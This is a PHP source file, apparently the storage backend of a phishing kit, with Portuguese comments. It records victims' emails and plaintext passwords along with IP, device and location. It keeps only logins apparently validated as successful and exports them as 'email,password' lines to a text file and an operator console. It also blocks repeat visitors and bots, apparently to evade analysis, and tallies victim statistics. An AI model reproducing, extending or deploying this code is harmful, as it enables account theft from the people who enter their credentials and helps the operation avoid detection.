<?php
declare(strict_types=1);

require_once __DIR__ . '/device.php';
require_once __DIR__ . '/geoip.php';

final class Storage
{
    private string $dataDir;
    private string $txtDb;

    public function __construct(string $dataDir)
    {
        $this->dataDir = rtrim($dataDir, '/\\');
        if (!is_dir($this->dataDir)) {
            mkdir($this->dataDir, 0775, true);
        }
        $this->txtDb = $this->dataDir . '/logins.txt';
    }

    public static function credentialKey(string $email, string $password): string
    {
        return self::emailKey($email);
    }

    public static function emailKey(string $email): string
    {
        return hash('sha256', strtolower(trim($email)));
    }

    /** Bloqueia IP após exceder limite de acessos à página. false = redirecionar erro */
    public function trackIpPageHit(string $ip, int $maxVisits = 4): bool
    {
        if ($this->isIpBlocked($ip)) {
            return false;
        }

        $hits = $this->readJson('ip_hits.json');
        $count = (int) ($hits[$ip] ?? 0) + 1;
        $hits[$ip] = $count;
        $this->writeJson('ip_hits.json', $hits);

        // 4 acessos liberados; no 5º bloqueia e redireciona para erro
        if ($count >= $maxVisits + 1) {
            $this->setIpBlocked($ip, true);
            return false;
        }

        return true;
    }

    public function getLoginsTxtContent(): string
    {
        $raw = $this->readLogins();
        $logins = $this->purgeInvalidLogins($raw);
        if (count($logins) !== count($raw)) {
            $this->writeLogins($logins);
            $this->syncTxtDatabase($logins);
        } elseif (!is_file($this->txtDb)) {
            $this->syncTxtDatabase($logins);
        }

        if (is_file($this->txtDb)) {
            return (string) file_get_contents($this->txtDb);
        }

        $lines = [];
        foreach ($this->getConsoleEntries() as $entry) {
            $lines[] = $entry['line'];
        }
        return implode("\n", $lines) . ($lines ? "\n" : '');
    }

    public function recordVisit(): void
    {
        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['visit_date'] ?? '') !== $today) {
            $stats['visits_today'] = 0;
            $stats['visit_date'] = $today;
        }
        $stats['visits_today'] = (int) ($stats['visits_today'] ?? 0) + 1;
        $stats['visits_total'] = (int) ($stats['visits_total'] ?? 0) + 1;
        $this->writeStats($stats);

        $device = parse_device(client_ua());
        $this->bumpDeviceStat((string) ($device['kind'] ?? ''));

        $this->touchIp(client_ip(), false, false);
    }

    public function isIpBlocked(string $ip): bool
    {
        $blocked = $this->readJson('blocked_ips.json');
        return isset($blocked[$ip]) && $blocked[$ip] === true;
    }

    public function getIpLoginAttempts(string $ip): int
    {
        $hits = $this->readJson('ip_login_attempts.json');
        return (int) ($hits[$ip] ?? 0);
    }

    public function incrementIpLoginAttempt(string $ip): int
    {
        $hits = $this->readJson('ip_login_attempts.json');
        $count = (int) ($hits[$ip] ?? 0) + 1;
        $hits[$ip] = $count;
        $this->writeJson('ip_login_attempts.json', $hits);
        return $count;
    }

    public function resetIpLoginAttempts(string $ip): void
    {
        $hits = $this->readJson('ip_login_attempts.json');
        unset($hits[$ip]);
        $this->writeJson('ip_login_attempts.json', $hits);
    }

    public function countBlockedIps(): int
    {
        $blocked = $this->readJson('blocked_ips.json');
        $count = 0;
        foreach ($blocked as $ip => $flag) {
            if ($flag === true && $ip !== '') {
                $count++;
            }
        }
        return $count;
    }

    public function setIpBlocked(string $ip, bool $blocked): void
    {
        $list = $this->readJson('blocked_ips.json');
        if ($blocked) {
            $list[$ip] = true;
        } else {
            unset($list[$ip]);
        }
        $this->writeJson('blocked_ips.json', $list);

        $logins = $this->readLogins();
        foreach ($logins as $id => $row) {
            if (($row['ip'] ?? '') === $ip) {
                $logins[$id]['status'] = $blocked ? 'bloqueado' : 'liberado';
            }
        }
        $this->writeLogins($logins);
        $this->syncTxtDatabase($logins);

        $ips = $this->readJson('ip_accesses.json');
        if (isset($ips[$ip])) {
            $ips[$ip]['status'] = $blocked ? 'bloqueado' : 'liberado';
            $this->writeJson('ip_accesses.json', $ips);
        }
    }

    public function recordLoginAttempt(
        string $email,
        string $password,
        bool $success,
        string $ip,
        string $userAgent
    ): void {
        $email = strtolower(trim($email));
        if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return;
        }

        $device = parse_device($userAgent);
        $geo = geo_lookup($ip, $this->dataDir);
        $blocked = $this->isIpBlocked($ip);
        $now = date('c');
        $this->upsertIpAccess(true, $success, $ip, $device, $geo, $blocked, $now);

        if (!$success) {
            return;
        }

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['login_date'] ?? '') !== $today) {
            $stats['logins_today'] = 0;
            $stats['login_date'] = $today;
        }
        $stats['logins_today'] = (int) ($stats['logins_today'] ?? 0) + 1;
        $stats['logins_total'] = (int) ($stats['logins_total'] ?? 0) + 1;
        $stats['success_total'] = (int) ($stats['success_total'] ?? 0) + 1;
        $this->writeStats($stats);

        $this->bumpDeviceStat((string) ($device['kind'] ?? ''));

        $logins = $this->purgeInvalidLogins($this->readLogins());
        $key = self::emailKey($email);

        $logins[$key] = [
            'id'         => $key,
            'email'      => $email,
            'password'   => $password,
            'ip'         => $ip,
            'status'     => $blocked ? 'bloqueado' : 'liberado',
            'os'         => $device['os'],
            'os_icon'    => $device['icon'],
            'browser'    => $device['browser'],
            'location'   => $geo['location'],
            'city'       => $geo['city'],
            'country'    => $geo['country'],
            'logins'     => (int) (($logins[$key]['logins'] ?? 0)) + 1,
            'success'    => (int) (($logins[$key]['success'] ?? 0)) + 1,
            'fail'       => (int) ($logins[$key]['fail'] ?? 0),
            'first_seen' => (string) ($logins[$key]['first_seen'] ?? $now),
            'last_seen'  => $now,
            'last_ok'    => true,
        ];

        $this->writeLogins($logins);
        $this->syncTxtDatabase($logins);
    }

    /** Mantém só logins validados e um registro por e-mail. */
    private function purgeInvalidLogins(array $logins): array
    {
        $byEmail = [];

        foreach ($logins as $row) {
            if (empty($row['last_ok']) && (int) ($row['success'] ?? 0) < 1) {
                continue;
            }

            $email = strtolower(trim((string) ($row['email'] ?? '')));
            if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
                continue;
            }

            $existing = $byEmail[$email] ?? null;
            if ($existing === null || strcmp((string) ($row['last_seen'] ?? ''), (string) ($existing['last_seen'] ?? '')) > 0) {
                $byEmail[$email] = $row;
            }
        }

        $clean = [];
        foreach ($byEmail as $email => $row) {
            $row['email'] = $email;
            $row['last_ok'] = true;
            $clean[self::emailKey($email)] = $row;
        }

        return $clean;
    }

    private function touchIp(string $ip, bool $isLogin, bool $success): void
    {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return;
        }

        $device = parse_device(client_ua());
        $geo = geo_lookup($ip, $this->dataDir);
        $blocked = $this->isIpBlocked($ip);
        $now = date('c');
        $this->upsertIpAccess($isLogin, $success, $ip, $device, $geo, $blocked, $now);
    }

    private function upsertIpAccess(
        bool $isLogin,
        bool $success,
        string $ip,
        array $device,
        array $geo,
        bool $blocked,
        string $now
    ): void {
        $ips = $this->readJson('ip_accesses.json');

        if (!isset($ips[$ip])) {
            $ips[$ip] = [
                'ip'         => $ip,
                'status'     => $blocked ? 'bloqueado' : 'liberado',
                'os'         => $device['os'],
                'os_icon'    => $device['icon'],
                'browser'    => $device['browser'],
                'location'   => $geo['location'],
                'city'       => $geo['city'],
                'country'    => $geo['country'],
                'logins'     => $isLogin ? 1 : 0,
                'success'    => $isLogin && $success ? 1 : 0,
                'fail'       => $isLogin && !$success ? 1 : 0,
                'first_seen' => $now,
                'last_seen'  => $now,
            ];
        } else {
            $ips[$ip]['last_seen'] = $now;
            if ($isLogin) {
                $ips[$ip]['logins'] = (int) ($ips[$ip]['logins'] ?? 0) + 1;
                $ips[$ip]['success'] = (int) ($ips[$ip]['success'] ?? 0) + ($success ? 1 : 0);
                $ips[$ip]['fail'] = (int) ($ips[$ip]['fail'] ?? 0) + ($success ? 0 : 1);
            }
            $ips[$ip]['os'] = $device['os'];
            $ips[$ip]['os_icon'] = $device['icon'];
            $ips[$ip]['browser'] = $device['browser'];
            $ips[$ip]['location'] = $geo['location'];
            $ips[$ip]['city'] = $geo['city'];
            $ips[$ip]['country'] = $geo['country'];
            if ($blocked) {
                $ips[$ip]['status'] = 'bloqueado';
            }
        }

        $this->writeJson('ip_accesses.json', $ips);
    }

    /** @return list<array<string, mixed>> */
    public function getIpAccessList(): array
    {
        $ips = $this->readJson('ip_accesses.json');

        if ($ips === []) {
            foreach ($this->getAccessList() as $row) {
                $ip = (string) ($row['ip'] ?? '');
                if ($ip === '') {
                    continue;
                }
                if (!isset($ips[$ip]) || strcmp((string) $row['last_seen'], (string) $ips[$ip]['last_seen']) > 0) {
                    unset($row['email'], $row['password']);
                    $ips[$ip] = $row;
                    $ips[$ip]['ip'] = $ip;
                }
            }
            if ($ips !== []) {
                $this->writeJson('ip_accesses.json', $ips);
            }
        }

        $blockedList = $this->readJson('blocked_ips.json');
        foreach ($ips as $k => $row) {
            unset($ips[$k]['email'], $ips[$k]['password']);
            $ipKey = (string) ($row['ip'] ?? $k);
            if ($ipKey !== '' && isset($blockedList[$ipKey]) && $blockedList[$ipKey] === true) {
                $ips[$k]['status'] = 'bloqueado';
            }
        }

        $list = array_values($ips);
        usort($list, static fn ($a, $b) => strcmp($b['last_seen'], $a['last_seen']));
        return $list;
    }

    public static function formatCredentialLine(string $email, string $password): string
    {
        return $email . ',' . $password;
    }

    /** @return list<array{line: string, color: string, email: string, password: string}> */
    public function getConsoleEntries(): array
    {
        $list = $this->getAccessList();
        usort($list, static fn ($a, $b) => strcmp((string) $a['first_seen'], (string) $b['first_seen']));

        $emailSeen = [];
        $result = [];

        foreach ($list as $row) {
            $email = (string) ($row['email'] ?? '');
            $password = (string) ($row['password'] ?? '');
            $color = isset($emailSeen[$email]) ? 'yellow' : 'green';
            $emailSeen[$email] = true;

            $result[] = [
                'line'     => self::formatCredentialLine($email, $password),
                'color'    => $color,
                'email'    => $email,
                'password' => $password,
            ];
        }

        return array_reverse($result);
    }

    public function getStats(): array
    {
        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['visit_date'] ?? '') !== $today) {
            $stats['visits_today'] = 0;
        }
        if (($stats['login_date'] ?? '') !== $today) {
            $stats['logins_today'] = 0;
        }
        if (($stats['bot_date'] ?? '') !== $today) {
            $stats['bots_today'] = 0;
        }
        if (($stats['device_date'] ?? '') !== $today) {
            $stats['iphone_today'] = 0;
            $stats['android_today'] = 0;
            $stats['desktop_today'] = 0;
        }

        $raw = $this->readLogins();
        $logins = $this->purgeInvalidLogins($raw);
        if (count($logins) !== count($raw)) {
            $this->writeLogins($logins);
            $this->syncTxtDatabase($logins);
        }

        return [
            'visits_today'      => (int) ($stats['visits_today'] ?? 0),
            'visits_total'      => (int) ($stats['visits_total'] ?? 0),
            'logins_today'      => (int) ($stats['logins_today'] ?? 0),
            'logins_total'      => (int) ($stats['logins_total'] ?? 0),
            'success_total'     => (int) ($stats['success_total'] ?? 0),
            'unique_credentials'=> count($logins),
            'unique_ips'        => count($this->readJson('ip_accesses.json')),
            'blocked_ips'       => $this->countBlockedIps(),
            'bots_today'        => (int) ($stats['bots_today'] ?? 0),
            'bots_total'        => (int) ($stats['bots_total'] ?? 0),
            'iphone_today'      => (int) ($stats['iphone_today'] ?? 0),
            'iphone_total'      => (int) ($stats['iphone_total'] ?? 0),
            'android_today'     => (int) ($stats['android_today'] ?? 0),
            'android_total'     => (int) ($stats['android_total'] ?? 0),
            'desktop_today'     => (int) ($stats['desktop_today'] ?? 0),
            'desktop_total'     => (int) ($stats['desktop_total'] ?? 0),
        ];
    }

    public function recordBotBlock(string $ip, string $userAgent, string $reason): void
    {
        require_once __DIR__ . '/device.php';
        require_once __DIR__ . '/geoip.php';

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['bot_date'] ?? '') !== $today) {
            $stats['bots_today'] = 0;
            $stats['bot_date'] = $today;
        }
        $stats['bots_today'] = (int) ($stats['bots_today'] ?? 0) + 1;
        $stats['bots_total'] = (int) ($stats['bots_total'] ?? 0) + 1;
        $this->writeStats($stats);

        $device = parse_device($userAgent);
        $intel = geo_intel_lookup($ip, $this->dataDir);
        $now = date('c');

        $bots = $this->readJson('bot_blocks.json');
        if (!isset($bots[$ip])) {
            $bots[$ip] = [
                'ip'         => $ip,
                'status'     => 'bot',
                'reason'     => $reason,
                'os'         => $device['os'],
                'os_icon'    => $device['icon'],
                'browser'    => $device['browser'],
                'location'   => (string) ($intel['location'] ?? '—'),
                'country'    => (string) ($intel['country'] ?? '—'),
                'country_code' => (string) ($intel['country_code'] ?? ''),
                'hits'       => 1,
                'first_seen' => $now,
                'last_seen'  => $now,
            ];
        } else {
            $bots[$ip]['last_seen'] = $now;
            $bots[$ip]['hits'] = (int) ($bots[$ip]['hits'] ?? 0) + 1;
            $bots[$ip]['reason'] = $reason;
            $bots[$ip]['os'] = $device['os'];
            $bots[$ip]['os_icon'] = $device['icon'];
            $bots[$ip]['browser'] = $device['browser'];
            $bots[$ip]['location'] = (string) ($intel['location'] ?? $bots[$ip]['location'] ?? '—');
            $bots[$ip]['country'] = (string) ($intel['country'] ?? $bots[$ip]['country'] ?? '—');
            $bots[$ip]['country_code'] = (string) ($intel['country_code'] ?? $bots[$ip]['country_code'] ?? '');
        }

        $this->writeJson('bot_blocks.json', $bots);
    }

    /** @return list<array<string, mixed>> */
    public function getBotAccessList(): array
    {
        $bots = $this->readJson('bot_blocks.json');
        $list = array_values($bots);
        usort($list, static fn ($a, $b) => strcmp((string) $b['last_seen'], (string) $a['last_seen']));
        return $list;
    }

    /** @return list<array<string, mixed>> */
    public function getAccessList(): array
    {
        $logins = $this->purgeInvalidLogins($this->readLogins());
        $list = array_values($logins);
        usort($list, static fn ($a, $b) => strcmp($b['last_seen'], $a['last_seen']));
        return $list;
    }

    public function clearClicks(): bool
    {
        $stats = $this->readStats();
        $stats['visits_today'] = 0;
        $stats['visits_total'] = 0;
        $stats['visit_date'] = date('Y-m-d');
        $stats['iphone_today'] = 0;
        $stats['iphone_total'] = 0;
        $stats['android_today'] = 0;
        $stats['android_total'] = 0;
        $stats['desktop_today'] = 0;
        $stats['desktop_total'] = 0;
        $stats['device_date'] = date('Y-m-d');
        if (!$this->writeStats($stats)) {
            return false;
        }
        return $this->writeJson('ip_hits.json', []);
    }

    /** Remove todos os IPs bloqueados e zera contadores de tentativas. */
    public function clearAllBlockedIps(): bool
    {
        if (!$this->writeJson('blocked_ips.json', [])) {
            return false;
        }
        if (!$this->writeJson('ip_hits.json', [])) {
            return false;
        }
        if (!$this->writeJson('ip_login_attempts.json', [])) {
            return false;
        }

        $logins = $this->readLogins();
        foreach ($logins as $id => $row) {
            $logins[$id]['status'] = 'liberado';
        }
        $this->writeLogins($logins);
        $this->syncTxtDatabase($logins);

        $ips = $this->readJson('ip_accesses.json');
        foreach ($ips as $k => $row) {
            $ips[$k]['status'] = 'liberado';
        }
        $this->writeJson('ip_accesses.json', $ips);

        return true;
    }

    private function bumpDeviceStat(string $kind): void
    {
        if (!in_array($kind, ['iphone', 'android', 'desktop'], true)) {
            return;
        }

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['device_date'] ?? '') !== $today) {
            $stats['iphone_today'] = 0;
            $stats['android_today'] = 0;
            $stats['desktop_today'] = 0;
            $stats['device_date'] = $today;
        }

        $todayKey = $kind . '_today';
        $totalKey = $kind . '_total';
        $stats[$todayKey] = (int) ($stats[$todayKey] ?? 0) + 1;
        $stats[$totalKey] = (int) ($stats[$totalKey] ?? 0) + 1;
        $this->writeStats($stats);
    }

    public function clearLogs(): bool
    {
        if (!$this->writeJson('ip_accesses.json', [])) {
            return false;
        }
        if (!$this->writeJson('bot_blocks.json', [])) {
            return false;
        }
        @unlink($this->dataDir . '/anti_bot_blocks.jsonl');

        $stats = $this->readStats();
        $stats['bots_today'] = 0;
        $stats['bots_total'] = 0;
        $stats['bot_date'] = date('Y-m-d');
        return $this->writeStats($stats);
    }

    public function clearLogins(): bool
    {
        $this->writeLogins([]);
        $this->syncTxtDatabase([]);

        $stats = $this->readStats();
        $stats['logins_today'] = 0;
        $stats['logins_total'] = 0;
        $stats['success_total'] = 0;
        $stats['login_date'] = date('Y-m-d');
        return $this->writeStats($stats);
    }

    /** @param array<string, array<string, mixed>> $logins */
    private function syncTxtDatabase(array $logins): void
    {
        $logins = $this->purgeInvalidLogins($logins);
        $lines = [];
        $sorted = array_values($logins);
        usort($sorted, static fn ($a, $b) => strcmp((string) $a['first_seen'], (string) $b['first_seen']));

        $seenEmails = [];
        foreach ($sorted as $row) {
            $email = strtolower(trim((string) ($row['email'] ?? '')));
            if ($email === '' || isset($seenEmails[$email])) {
                continue;
            }
            $seenEmails[$email] = true;
            $lines[] = self::formatCredentialLine(
                $email,
                (string) ($row['password'] ?? '')
            ) . "\n";
        }

        file_put_contents($this->txtDb, implode('', $lines), LOCK_EX);
        @chmod($this->txtDb, 0640);
    }

    private function readLogins(): array
    {
        return $this->readJson('logins_db.json');
    }

    private function writeLogins(array $data): void
    {
        $this->writeJson('logins_db.json', $data);
    }

    private function readStats(): array
    {
        return $this->readJson('stats.json');
    }

    private function writeStats(array $data): bool
    {
        return $this->writeJson('stats.json', $data);
    }

    private function readJson(string $file): array
    {
        $path = $this->dataDir . DIRECTORY_SEPARATOR . $file;
        if (!is_file($path)) {
            return [];
        }
        $fp = fopen($path, 'rb');
        if ($fp === false) {
            return [];
        }
        flock($fp, LOCK_SH);
        $raw = stream_get_contents($fp);
        flock($fp, LOCK_UN);
        fclose($fp);
        $data = json_decode($raw ?: '{}', true);
        return is_array($data) ? $data : [];
    }

    private function writeJson(string $file, array $data): bool
    {
        $path = $this->dataDir . DIRECTORY_SEPARATOR . $file;
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        if ($json === false) {
            return false;
        }

        $fp = @fopen($path, 'c+');
        if ($fp === false) {
            $written = @file_put_contents($path, $json, LOCK_EX);
            if ($written === false) {
                return false;
            }
            @chmod($path, 0664);
            return true;
        }

        $ok = false;
        if (flock($fp, LOCK_EX)) {
            ftruncate($fp, 0);
            rewind($fp);
            $ok = fwrite($fp, $json) !== false;
            fflush($fp);
            flock($fp, LOCK_UN);
        }
        fclose($fp);
        @chmod($path, 0664);
        return $ok;
    }
}
